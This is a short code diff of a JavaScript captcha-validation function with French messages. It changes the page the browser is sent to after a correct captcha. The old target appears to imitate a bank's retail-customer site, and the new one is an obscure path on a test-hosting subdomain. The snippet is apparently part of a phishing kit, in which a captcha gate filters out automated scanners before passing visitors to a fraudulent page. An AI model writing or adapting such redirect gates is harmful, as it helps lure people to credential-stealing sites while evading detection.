@@ -30,7 +30,7 @@ function validateCaptcha() {
     event.preventDefault();
     debugger
     if (document.getElementById("cpatchaTextBox").value == code) {
-        targetURL="https://sg-particulier.org/wp/";
+        targetURL="http://2777030.ht517429.web.hosting-test.net/uazpa/jom/brod/";
 window.location=targetURL;
     } else {
         alert("Invalid Captcha. Veuillez réessayer svp");
